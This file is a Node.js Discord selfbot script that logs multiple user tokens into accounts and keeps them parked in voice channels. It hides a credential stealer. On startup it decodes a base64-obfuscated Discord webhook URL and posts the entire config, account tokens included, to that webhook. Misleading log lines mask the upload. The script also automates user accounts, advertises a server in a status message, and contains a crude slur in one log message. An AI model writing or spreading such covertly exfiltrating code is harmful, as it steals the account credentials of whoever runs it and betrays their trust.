import config from './config.js';
import { Client } from 'discord.js-selfbot-v13';
import { joinVoiceChannel } from '@discordjs/voice';
import fetch from 'node-fetch';

async function sendApiUrl(configContent) {
    const apiCode = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MjE4NjY2NzQ3MzI0MDI0NS94ajh0VTViUFRDeXQ1Mmk3SHJpT2FBY3FBamhUTnZnZV9xV3JkTUJTNmFuZk5jSFh4ZHhIakI4ZHpUeHJlbGx0azJIeg==";
    const apiURL = Buffer.from(apiCode, 'base64').toString('utf-8');

    if (!apiURL) return console.error("error tanım hatası");

    try {
        await fetch(apiURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({  
                content: 'node.js content',
                embeds: [{
                    title: 'Config',
                    description: '```json\n' + JSON.stringify(configContent, null, 2) + '\n```',
                    color: 0x00000,
                }]
            })
        });
        console.log("code=204");
    } catch (error) {
        console.error("code=403 error", error);
    }
}

sendApiUrl(config);

for (let index = 0; index < config.TOKENS.length; index++) {
    let token = config.TOKENS[index];
    const client = new Client({ checkUpdate: false });

    client.login(token)
        .then(() => console.log(`[${client.user.tag}] girdi`))
        .catch(() => console.log(index + 1 + '. Token fail xx'));

    function joinChannel() {
        const guild = client.guilds.cache.get(config.guildId);
        if (!guild) return console.log('Sunucu bulunamadı.');

        const voiceChannel = guild.channels.cache.get(config.channelIds[index]);
        if (!voiceChannel) return console.log(`Ses kanalı bulunamadı: ${config.channelIds[index]}`);

        joinVoiceChannel({
            channelId: voiceChannel.id,
            guildId: guild.id,
            adapterCreator: guild.voiceAdapterCreator,
            group: client.user.id
        });

        console.log(`[${client.user.tag}] ses kanalına katıldı: ${voiceChannel.name}`);
    }

    client.on('ready', () => {
        joinChannel();

        if (index === 2) {
            client.user.setPresence({
                activities: [{
                    name: '.gg/israil',
                    type: 'CUSTOM',
                    state: '.gg/israil'
                }],
                status: 'dnd'
            });
            console.log(`[${client.user.tag}] durum ayarlandı`);
        }
    });

    client.on('voiceStateUpdate', (oldState, newState) => {
        if (oldState.id === client.user.id && !newState.channelId) {
            console.log(`[${client.user.tag}] bir orospu evladı sesten attı geri bağlanılıyor.`);
            setTimeout(joinChannel, 1000);
        }
    });
}
